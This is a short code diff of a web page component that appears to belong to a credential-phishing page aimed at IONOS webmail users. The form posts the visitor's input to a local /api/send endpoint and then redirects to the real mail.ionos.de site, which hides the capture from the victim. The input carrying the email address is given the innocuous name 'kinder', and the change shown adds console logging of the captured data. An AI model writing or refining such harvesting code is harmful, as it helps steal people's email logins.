@@ -15,12 +15,14 @@ export default function Home() {
       }
     }
 
+    console.log(dataObj);
+
     try {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
       if (result.status === 200) {
-        return window.location.replace("https://mail.ionos.de/");
-        // console.log(result.data);
+        // return window.location.replace("https://mail.ionos.de/");
+        console.log(result.data);
       }
       return;
     } catch (error) {
@@ -38,7 +40,7 @@ export default function Home() {
 
             <div className="mt-5 relative h-9">
               <input
-                type="text"
+                type="email"
                 name="kinder"
                 id="kinder"
                 className="h-full w-full border text-[#575a5b] border-[#acb0b2] placeholder:text-xs pl-8 outline-none focus:border-sky-500"
